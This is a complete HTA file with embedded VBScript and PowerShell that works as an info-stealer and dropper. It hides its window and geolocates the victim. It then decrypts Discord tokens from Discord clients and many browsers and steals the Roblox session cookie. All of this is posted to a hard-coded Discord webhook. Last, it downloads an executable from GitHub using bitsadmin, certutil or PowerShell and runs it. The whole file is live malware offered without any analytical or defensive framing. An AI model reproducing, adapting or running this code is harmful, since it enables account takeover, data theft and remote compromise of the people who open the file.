<html>
<head><title>.</title>
<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
<script language="VBScript">
window.resizeTo 0,0 : window.moveTo -2000,-2000
On Error Resume Next

Dim sh, fso, WH, PC, USER
Dim GEO_IP, GEO_COUNTRY, GEO_REGION, GEO_CITY, GEO_ISP, GEO_TARGET

Set sh  = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

WH   = "https://discordapp.com/api/webhooks/1551972586252927049/catFwspybQjsFn-37A5y4qAgptvv8lYoC-3P2-gz3u0e01pEB0Sq6e6ywotOW9tR0XoQ"
PC   = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
USER = sh.ExpandEnvironmentStrings("%USERNAME%")

' === STEP 1: Geo IP ===
Call GetGeoIP()

' === STEP 2: Discord Token ===
Call GrabDiscord()

' === STEP 3: Roblox Cookie ===
Call GrabRoblox()

' === STEP 4: RAT ===
Call DropRAT()

window.close()

' ============================================================
' GEO IP
' ============================================================

Sub GetGeoIP()
    GEO_IP      = "Unknown"
    GEO_COUNTRY = "Unknown"
    GEO_REGION  = "Unknown"
    GEO_CITY    = "Unknown"
    GEO_ISP     = "Unknown"

    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "GET", "http://ip-api.com/json/?fields=status,query,country,regionName,city,isp", False
    h.Send

    If h.Status = 200 Then
        Dim r: r = h.ResponseText
        GEO_IP      = JsonGet(r, "query")
        GEO_COUNTRY = JsonGet(r, "country")
        GEO_REGION  = JsonGet(r, "regionName")
        GEO_CITY    = JsonGet(r, "city")
        GEO_ISP     = JsonGet(r, "isp")
    End If

    Set h = Nothing
    GEO_TARGET = "IP: " & GEO_IP & " | " & GEO_COUNTRY & " | " & GEO_REGION & " | " & GEO_CITY & " | " & GEO_ISP & " | PC: " & PC & " | " & USER
End Sub

Function JsonGet(json, key)
    JsonGet = ""
    Dim re: Set re = New RegExp
    re.Pattern = """" & key & """\s*:\s*""([^""]+)"""
    re.Global  = False
    Dim m: Set m = re.Execute(json)
    If m.Count > 0 Then JsonGet = m(0).SubMatches(0)
    Set re = Nothing
End Function

' ============================================================
' DISCORD TOKEN GRABBER
' ============================================================

Sub GrabDiscord()
    Dim psPath: psPath = TmpFile("dzgrab.ps1")
    Dim outPath: outPath = TmpFile("dzout.txt")
    Dim f: Set f = fso.CreateTextFile(psPath, True)

    ' write PS script line by line — no string concat
    f.WriteLine "param()"
    f.WriteLine "Add-Type -AssemblyName System.Security"
    f.WriteLine "$WH      = '" & WH & "'"
    f.WriteLine "$PC      = '" & Ej(PC) & "'"
    f.WriteLine "$USER    = '" & Ej(USER) & "'"
    f.WriteLine "$TARGET  = '" & Ej(GEO_TARGET) & "'"
    f.WriteLine "$OUT     = '" & outPath & "'"
    f.WriteLine "$LOCAL   = $env:LOCALAPPDATA"
    f.WriteLine "$ROAMING = $env:APPDATA"
    f.WriteLine ""
    f.WriteLine "function Get-Key($base) {"
    f.WriteLine "    try {"
    f.WriteLine "        $ls = Join-Path $base 'Local State'"
    f.WriteLine "        if (-not (Test-Path $ls)) { return $null }"
    f.WriteLine "        $j  = Get-Content $ls -Raw | ConvertFrom-Json"
    f.WriteLine "        $ek = [Convert]::FromBase64String($j.os_crypt.encrypted_key)"
    f.WriteLine "        $ek = $ek[5..($ek.Length-1)]"
    f.WriteLine "        return [Security.Cryptography.ProtectedData]::Unprotect($ek,$null,'CurrentUser')"
    f.WriteLine "    } catch { return $null }"
    f.WriteLine "}"
    f.WriteLine ""
    f.WriteLine "function Dec-Token($enc, $key) {"
    f.WriteLine "    try {"
    f.WriteLine "        if ($enc.Length -lt 15) { return $null }"
    f.WriteLine "        $pfx = [Text.Encoding]::ASCII.GetString($enc[0..2])"
    f.WriteLine "        if ($pfx -ne 'v10' -and $pfx -ne 'v11') { return $null }"
    f.WriteLine "        $iv   = $enc[3..14]"
    f.WriteLine "        $ct   = $enc[15..($enc.Length-17)]"
    f.WriteLine "        $tag  = $enc[($enc.Length-16)..($enc.Length-1)]"
    f.WriteLine "        $src  = @'"
    f.WriteLine "using System; using System.Security.Cryptography;"
    f.WriteLine "public static class Aes128 {"
    f.WriteLine "    public static byte[] Dec(byte[] k,byte[] n,byte[] c,byte[] t){"
    f.WriteLine "        var p=new byte[c.Length];"
    f.WriteLine "        using(var a=new AesGcm(k)){a.Decrypt(n,c,t,p);}"
    f.WriteLine "        return p;"
    f.WriteLine "    }"
    f.WriteLine "}"
    f.WriteLine "'@"
    f.WriteLine "        Add-Type -TypeDefinition $src -ErrorAction SilentlyContinue"
    f.WriteLine "        $plain = [Aes128]::Dec($key,$iv,$ct,$tag)"
    f.WriteLine "        return [Text.Encoding]::UTF8.GetString($plain)"
    f.WriteLine "    } catch { return $null }"
    f.WriteLine "}"
    f.WriteLine ""
    f.WriteLine "function Scan-LDB($path, $key) {"
    f.WriteLine "    $toks = [Collections.Generic.HashSet[string]]::new()"
    f.WriteLine "    if (-not (Test-Path $path)) { return $toks }"
    f.WriteLine "    $pat1 = 'dQw4w9WgXcQ:[A-Za-z0-9+/=_-]+'"
    f.WriteLine "    $pat2 = '[\w-]{24}\.[\w-]{6}\.[\w-]{27,28}'"
    f.WriteLine "    $pat3 = 'mfa\.[A-Za-z0-9_-]{84}'"
    f.WriteLine "    Get-ChildItem -Path $path -Include '*.ldb','*.log' -Recurse -EA SilentlyContinue | % {"
    f.WriteLine "        try {"
    f.WriteLine "            $raw = [IO.File]::ReadAllBytes($_.FullName)"
    f.WriteLine "            $txt = [Text.Encoding]::UTF8.GetString($raw)"
    f.WriteLine "            [regex]::Matches($txt,$pat1) | % {"
    f.WriteLine "                if ($key) {"
    f.WriteLine "                    try {"
    f.WriteLine "                        $b64  = $_.Value.Split(':',2)[1]"
    f.WriteLine "                        $b64  = $b64.PadRight($b64.Length+(4-$b64.Length%4)%4,'=')"
    f.WriteLine "                        $eb   = [Convert]::FromBase64String($b64)"
    f.WriteLine "                        $dec  = Dec-Token $eb $key"
    f.WriteLine "                        if ($dec -match '[\w-]{24}\.[\w-]{6}\.[\w-]{27}') { $toks.Add($dec) | Out-Null }"
    f.WriteLine "                    } catch {}"
    f.WriteLine "                }"
    f.WriteLine "            }"
    f.WriteLine "            [regex]::Matches($txt,$pat2) | % { $toks.Add($_.Value) | Out-Null }"
    f.WriteLine "            [regex]::Matches($txt,$pat3) | % { $toks.Add($_.Value) | Out-Null }"
    f.WriteLine "        } catch {}"
    f.WriteLine "    }"
    f.WriteLine "    return $toks"
    f.WriteLine "}"
    f.WriteLine ""
    f.WriteLine "function Val-Token($tok) {"
    f.WriteLine "    try {"
    f.WriteLine "        $wr = [Net.WebRequest]::Create('https://discord.com/api/v9/users/@me')"
    f.WriteLine "        $wr.Method  = 'GET'"
    f.WriteLine "        $wr.Timeout = 8000"
    f.WriteLine "        $wr.Headers.Add('Authorization',$tok)"
    f.WriteLine "        $wr.UserAgent = 'Mozilla/5.0'"
    f.WriteLine "        $rs = $wr.GetResponse()"
    f.WriteLine "        $rd = New-Object IO.StreamReader($rs.GetResponseStream())"
    f.WriteLine "        $j  = $rd.ReadToEnd() | ConvertFrom-Json"
    f.WriteLine "        $nt = @('None','Nitro Classic','Nitro','Nitro Basic')[[int]$j.premium_type]"
    f.WriteLine "        return [PSCustomObject]@{ Token=$tok; User=$j.username; Disc=$j.discriminator; ID=$j.id; Email=$j.email; Phone=$j.phone; MFA=$j.mfa_enabled; Nitro=$nt }"
    f.WriteLine "    } catch { return $null }"
    f.WriteLine "}"
    f.WriteLine ""
    f.WriteLine "function Post-WH($body) {"
    f.WriteLine "    try {"
    f.WriteLine "        $wr = [Net.WebRequest]::Create($WH)"
    f.WriteLine "        $wr.Method      = 'POST'"
    f.WriteLine "        $wr.ContentType = 'application/json'"
    f.WriteLine "        $wr.Timeout     = 8000"
    f.WriteLine "        $b  = [Text.Encoding]::UTF8.GetBytes($body)"
    f.WriteLine "        $wr.ContentLength = $b.Length"
    f.WriteLine "        $s  = $wr.GetRequestStream()"
    f.WriteLine "        $s.Write($b,0,$b.Length)"
    f.WriteLine "        $s.Close()"
    f.WriteLine "        $wr.GetResponse().Close()"
    f.WriteLine "    } catch {}"
    f.WriteLine "}"
    f.WriteLine ""
    f.WriteLine "function Esc($s) {"
    f.WriteLine "    $s = $s -replace '\\','\\\\'"
    f.WriteLine "    $s = $s -replace '""','\"" '"
    f.WriteLine "    $s = $s -replace ""`n"",'\n'"
    f.WriteLine "    $s = $s -replace ""`r"",'\n'"
    f.WriteLine "    return $s"
    f.WriteLine "}"
    f.WriteLine ""
    f.WriteLine "$TARGETS = [ordered]@{"
    f.WriteLine "    'Discord'        = ""$ROAMING\Discord"""
    f.WriteLine "    'Discord Canary' = ""$ROAMING\discordcanary"""
    f.WriteLine "    'Discord PTB'    = ""$ROAMING\discordptb"""
    f.WriteLine "    'Lightcord'      = ""$ROAMING\Lightcord"""
    f.WriteLine "    'Chrome'         = ""$LOCAL\Google\Chrome\User Data"""
    f.WriteLine "    'Chrome SxS'     = ""$LOCAL\Google\Chrome SxS\User Data"""
    f.WriteLine "    'Edge'           = ""$LOCAL\Microsoft\Edge\User Data"""
    f.WriteLine "    'Brave'          = ""$LOCAL\BraveSoftware\Brave-Browser\User Data"""
    f.WriteLine "    'Opera'          = ""$ROAMING\Opera Software\Opera Stable"""
    f.WriteLine "    'Opera GX'       = ""$ROAMING\Opera Software\Opera GX Stable"""
    f.WriteLine "    'Vivaldi'        = ""$LOCAL\Vivaldi\User Data"""
    f.WriteLine "    'Yandex'         = ""$LOCAL\Yandex\YandexBrowser\User Data"""
    f.WriteLine "    'Torch'          = ""$LOCAL\Torch\User Data"""
    f.WriteLine "    'Amigo'          = ""$LOCAL\Amigo\User Data"""
    f.WriteLine "    'Kometa'         = ""$LOCAL\Kometa\User Data"""
    f.WriteLine "    'Orbitum'        = ""$LOCAL\Orbitum\User Data"""
    f.WriteLine "    'CentBrowser'    = ""$LOCAL\CentBrowser\User Data"""
    f.WriteLine "    '7Star'          = ""$LOCAL\7Star\7Star\User Data"""
    f.WriteLine "    'Sputnik'        = ""$LOCAL\Sputnik\Sputnik\User Data"""
    f.WriteLine "    'Epic'           = ""$LOCAL\Epic Privacy Browser\User Data"""
    f.WriteLine "    'Uran'           = ""$LOCAL\uCozMedia\Uran\User Data"""
    f.WriteLine "    'Iridium'        = ""$LOCAL\Iridium\User Data"""
    f.WriteLine "}"
    f.WriteLine ""
    f.WriteLine "$all = [Collections.Generic.HashSet[string]]::new()"
    f.WriteLine "foreach ($name in $TARGETS.Keys) {"
    f.WriteLine "    $base = $TARGETS[$name]"
    f.WriteLine "    if (-not (Test-Path $base)) { continue }"
    f.WriteLine "    $key = Get-Key $base"
    f.WriteLine "    # browser default profile"
    f.WriteLine "    $ldb = Join-Path $base 'Default\Local Storage\leveldb'"
    f.WriteLine "    Scan-LDB $ldb $key | % { $all.Add($_) | Out-Null }"
    f.WriteLine "    # discord client — leveldb at root"
    f.WriteLine "    $ldb2 = Join-Path $base 'Local Storage\leveldb'"
    f.WriteLine "    Scan-LDB $ldb2 $key | % { $all.Add($_) | Out-Null }"
    f.WriteLine "    # extra profiles"
    f.WriteLine "    Get-ChildItem $base -Directory -EA SilentlyContinue | ? { $_.Name -match '^Profile' } | % {"
    f.WriteLine "        $ldb3 = Join-Path $_.FullName 'Local Storage\leveldb'"
    f.WriteLine "        Scan-LDB $ldb3 $key | % { $all.Add($_) | Out-Null }"
    f.WriteLine "    }"
    f.WriteLine "}"
    f.WriteLine ""
    f.WriteLine "if ($all.Count -eq 0) {"
    f.WriteLine "    $j = '{""embeds"":[{""title"":""🔑 Discord Token"",""description"":""No tokens found"",""color"":16711680,""fields"":[{""name"":""🎯 Target"",""value"":""' + $TARGET + '""}]}]}'"
    f.WriteLine "    Post-WH $j"
    f.WriteLine "    exit"
    f.WriteLine "}"
    f.WriteLine ""
    f.WriteLine "$valid = @()"
    f.WriteLine "foreach ($t in $all) {"
    f.WriteLine "    $info = Val-Token $t"
    f.WriteLine "    if ($info) { $valid += $info }"
    f.WriteLine "}"
    f.WriteLine ""
    f.WriteLine "if ($valid.Count -eq 0) {"
    f.WriteLine "    $raw = ($all | % { $_ }) -join '\n'"
    f.WriteLine "    $j   = '{""embeds"":[{""title"":""🔑 Discord Token"",""description"":""' + $($all.Count) + ' candidate(s) — unvalidated\n\n' + (Esc $raw) + '"",""color"":16776960,""fields"":[{""name"":""🎯 Target"",""value"":""' + $TARGET + '""}]}]}'"
    f.WriteLine "    Post-WH $j"
    f.WriteLine "    exit"
    f.WriteLine "}"
    f.WriteLine ""
    f.WriteLine "foreach ($r in $valid) {"
    f.WriteLine "    $uname = Esc($r.User + '#' + $r.Disc)"
    f.WriteLine "    $tok   = Esc($r.Token)"
    f.WriteLine "    $email = Esc('' + $r.Email)"
    f.WriteLine "    $phone = Esc('' + $r.Phone)"
    f.WriteLine "    $desc  = ""Token: $tok"""
    f.WriteLine "    $acct  = ""👤 **$uname** | ID: $($r.ID)\nEmail: $email | Phone: $phone | MFA: $($r.MFA) | Nitro: $($r.Nitro)"""
    f.WriteLine "    $j = '{""embeds"":[{""title"":""🔑 Discord Token"",""description"":""' + $desc + '"",""color"":5814783,""fields"":[{""name"":""Account"",""value"":""' + $acct + '""},{""name"":""🎯 Target"",""value"":""' + $TARGET + '""}]}]}'"
    f.WriteLine "    Post-WH $j"
    f.WriteLine "}"

    f.Close
    Set f = Nothing

    RunCmd "powershell -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & psPath & """"
    WScript.Sleep 3000
    fso.DeleteFile psPath, True
End Sub

' ============================================================
' ROBLOX COOKIE GRABBER
' ============================================================

Sub GrabRoblox()
    Dim paths(4)
    paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
    paths(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
    paths(2) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\Cookies"
    paths(3) = sh.ExpandEnvironmentStrings("%APPDATA%")      & "\Roblox\LocalStorage\robloxcookies.dat"
    paths(4) = sh.ExpandEnvironmentStrings("%USERPROFILE%")  & "\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"

    Dim i, fp, raw
    For i = 0 To 4
        If fso.FileExists(paths(i)) Then fp = paths(i) : Exit For
    Next

    If Len(fp) = 0 Then
        Dim pk: pk = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Packages"
        If fso.FolderExists(pk) Then
            Dim folder, subf
            Set folder = fso.GetFolder(pk)
            For Each subf In folder.SubFolders
                If InStr(subf.Name, "ROBLOX") > 0 Then
                    Dim uwp: uwp = subf.Path & "\LocalState\RobloxCookies.dat"
                    If fso.FileExists(uwp) Then fp = uwp : Exit For
                End If
            Next
            Set folder = Nothing
        End If
    End If

    If Len(fp) = 0 Then
        Call PostEmbed("🍪 Roblox Cookie", "Cookie not found on this machine.", 16711680)
        Exit Sub
    End If

    raw = ReadFile(fp)
    If Len(raw) < 50 Then
        Call PostEmbed("🍪 Roblox Cookie", "File too small (" & Len(raw) & " bytes).", 16711680)
        Exit Sub
    End If

    Dim cookie: cookie = ""
    Dim approach: approach = ""

    If InStr(raw, "_|WARNING") > 0 Then
        cookie   = raw
        approach = "Plaintext"
    End If

    If Len(cookie) = 0 And InStr(raw, "CookiesData") > 0 Then
        approach = "JSON-DPAPI"
        Dim sp: sp = InStr(raw, "CookiesData"":""")
        If sp > 0 Then
            sp = sp + 14
            Dim ep: ep = InStr(sp, raw, """")
            If ep > sp Then
                Dim b64: b64 = Mid(raw, sp, ep - sp)
                If Len(b64) > 100 Then
                    cookie = DecryptDPAPI(b64)
                    If Len(cookie) = 0 Then cookie = b64 : approach = "JSON-Raw"
                End If
            End If
        End If
    End If

    If Len(cookie) = 0 And InStr(raw, ".ROBLOSECURITY") > 0 Then
        approach = "Raw"
        Dim rp: rp = InStr(raw, ".ROBLOSECURITY")
        cookie = Mid(raw, rp)
    End If

    If Len(cookie) = 0 Then
        cookie   = raw
        approach = "RawFile"
    End If

    ' strip to just the token
    Dim cae: cae = InStr(cookie, "|$CAE")
    If cae = 0 Then cae = InStr(cookie, "|_CAE")
    If cae > 0 Then cookie = Mid(cookie, cae)

    ' extract just _|WARNING... token cleanly
    Dim wpos: wpos = InStr(cookie, "_|WARNING")
    Dim cleanCookie: cleanCookie = cookie
    If wpos > 0 Then cleanCookie = Mid(cookie, wpos)

    ' send as embed matching screenshot style
    Dim desc: desc = "Cookie: " & Left(cleanCookie, 1800)
    Dim tgt:  tgt  = GEO_TARGET

    Dim j: j = "{""embeds"":[{" & _
        """title"":""" & Chr(127850) & " Roblox Cookie"","  & _
        """description"":""" & Ej(desc) & """," & _
        """color"":16744272," & _
        """fields"":[{""name"":""" & Chr(127919) & " Target"",""value"":""" & Ej(tgt) & """,""inline"":false}]" & _
        "}]}"

    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "POST", WH, False
    h.SetRequestHeader "Content-Type", "application/json"
    h.Send j
    Set h = Nothing

    ' also send full cookie as file
    Call PostFile("cookie.txt", cleanCookie)
End Sub

' ============================================================
' RAT DROPPER
' ============================================================

Sub DropRAT()
    Dim temp: temp = sh.ExpandEnvironmentStrings("%TEMP%") & "\mrrobot.exe"
    Dim dl:   dl   = "https://github.com/sasukeuchicaj-debug/fictional-guide/raw/refs/heads/main/mrrobot.exe"
    sh.Run "bitsadmin /transfer wd /download /priority high " & Chr(34) & dl & Chr(34) & " " & Chr(34) & temp & Chr(34), 0, True
    If Not fso.FileExists(temp) Then
        sh.Run "certutil -urlcache -split -f " & Chr(34) & dl & Chr(34) & " " & Chr(34) & temp & Chr(34), 0, True
    End If
    If Not fso.FileExists(temp) Then
        sh.Run "powershell -WindowStyle Hidden -Command Invoke-WebRequest -Uri '" & dl & "' -OutFile '" & temp & "'", 0, True
    End If
    If fso.FileExists(temp) Then sh.Run Chr(34) & temp & Chr(34), 0, False
End Sub

' ============================================================
' DPAPI
' ============================================================

Function DecryptDPAPI(b64)
    DecryptDPAPI = ""
    On Error Resume Next
    Dim inf:  inf  = TmpFile("dpi.txt")
    Dim outf: outf = TmpFile("dpo.txt")
    fso.DeleteFile outf, True
    WriteFile inf, b64
    Dim ps: ps = "Add-Type -AN System.Security;try{$b=[Convert]::FromBase64String((gc '" & inf & "' -Raw).Trim());$d=[Security.Cryptography.ProtectedData]::Unprotect($b,$null,'CurrentUser');[Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Enc utf8}catch{''|Out-File '" & outf & "'}"
    Dim psf: psf = TmpFile("dpapi.ps1")
    WriteFile psf, ps
    RunCmd "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & psf & """"
    WScript.Sleep 1500
    If fso.FileExists(outf) Then
        If fso.GetFile(outf).Size > 20 Then DecryptDPAPI = ReadFile(outf)
    End If
    fso.DeleteFile inf,  True
    fso.DeleteFile psf,  True
    fso.DeleteFile outf, True
End Function

' ============================================================
' HELPERS
' ============================================================

Sub RunCmd(cmd)
    On Error Resume Next
    Dim w, p, id, s
    Set w = GetObject("winmgmts:\\.\root\cimv2")
    Set s = w.Get("Win32_ProcessStartup").SpawnInstance_
    s.ShowWindow = 0
    Set p = w.Get("Win32_Process")
    p.Create cmd,,s,id
    If id = 0 Then Exit Sub
    Dim running: running = True
    Do While running
        Set w = GetObject("winmgmts:\\.\root\cimv2")
        running = (w.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE ProcessId=" & id).Count > 0)
        Set w = Nothing
        If running Then WScript.Sleep 200
    Loop
End Sub

Function TmpFile(name)
    TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name
End Function

Sub WriteFile(path, content)
    On Error Resume Next
    Dim f: Set f = fso.CreateTextFile(path, True)
    f.Write content
    f.Close
    Set f = Nothing
End Sub

Function ReadFile(path)
    ReadFile = ""
    On Error Resume Next
    Dim f: Set f = fso.OpenTextFile(path, 1)
    ReadFile = f.ReadAll
    f.Close
    Set f = Nothing
End Function

Sub PostEmbed(t, d, c)
    On Error Resume Next
    Dim tgt: tgt = GEO_TARGET
    Dim j: j = "{""embeds"":[{""title"":""" & Ej(t) & """,""description"":""" & Ej(d) & """,""color"":" & c & ",""fields"":[{""name"":""" & Chr(127919) & " Target"",""value"":""" & Ej(tgt) & """}]}]}"
    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "POST", WH, False
    h.SetRequestHeader "Content-Type", "application/json"
    h.Send j
    Set h = Nothing
End Sub

Sub PostFile(fn, ct)
    On Error Resume Next
    Dim b:  b  = MkGuid()
    Dim bd: bd = "--" & b & vbCrLf & _
                 "Content-Disposition: form-data; name=""file""; filename=""" & fn & """" & vbCrLf & vbCrLf & _
                 ct & vbCrLf & "--" & b & "--"
    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "POST", WH, False
    h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b
    h.Send bd
    Set h = Nothing
End Sub

Function Ej(s)
    s = Replace(s, "\",    "\\")
    s = Replace(s, """",   "\""")
    s = Replace(s, vbCrLf, "\n")
    s = Replace(s, vbCr,   "\n")
    s = Replace(s, vbLf,   "\n")
    s = Replace(s, vbTab,  "\t")
    Ej = s
End Function

Function MkGuid()
    Dim t: Set t = CreateObject("Scriptlet.TypeLib")
    MkGuid = Mid(t.GUID, 2, 36)
    Set t = Nothing
End Function
</script>
</head><body></body></html>
